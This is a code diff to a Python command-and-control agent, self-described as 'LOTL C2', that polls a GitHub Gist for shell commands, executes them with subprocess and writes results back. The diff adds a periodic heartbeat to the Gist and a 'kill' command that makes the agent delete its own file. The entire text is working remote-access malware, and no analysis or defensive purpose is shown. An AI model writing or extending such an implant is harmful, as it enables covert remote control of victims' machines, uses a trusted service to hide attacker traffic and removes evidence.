@@ -2,7 +2,10 @@ import requests
 import json
 import logging
 import time
-from .c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME
+from datetime import datetime
+from .c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME, STATUS_FILENAME
+from .system import self_delete
+import sys
 
 GIST_API_URL = "https://api.github.com/gists"
 
@@ -69,11 +72,26 @@ def lotl_agent(gist_id, github_token, sleep_interval=60):
     """
     logging.info(f"LOTL C2 agent started. Polling Gist ID: {gist_id}")
 
+    last_status_update = 0
+    status_interval = 30 # seconds
+
     while True:
         try:
+            # Update status periodically
+            if time.time() - last_status_update > status_interval:
+                timestamp = datetime.now().isoformat()
+                update_gist(gist_id, STATUS_FILENAME, timestamp, github_token)
+                last_status_update = time.time()
+
             command = get_gist_content(gist_id, COMMAND_FILENAME)
             if command and command.strip() != "waiting...":
                 logging.info(f"Received command: {command}")
+
+                if command.strip() == "kill":
+                    logging.info("Received kill command. Self-destructing...")
+                    update_gist(gist_id, OUTPUT_FILENAME, "Agent terminated.", github_token)
+                    self_delete(sys.argv[0])
+                    break # Exit the loop
 
                 import subprocess
                 output = subprocess.getoutput(command)
